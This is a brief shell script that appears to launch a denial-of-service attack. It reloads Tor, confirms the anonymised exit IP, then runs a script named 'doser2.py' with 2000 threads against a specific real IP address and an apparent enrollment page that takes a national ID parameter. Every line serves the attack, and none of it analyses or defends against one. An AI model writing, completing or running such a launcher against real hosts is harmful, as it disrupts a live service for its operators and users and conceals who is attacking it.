#!/bin/sh
service tor reload &>/dev/null
curl --socks5 127.0.0.1:9050 ip.p3terx.com
python3 doser2.py -g 'http://167.172.229.66/proceso-inscripcion/index2.php?dni=79999999999999999999999&est=1&formdoc=D.N.I.' -t 2000
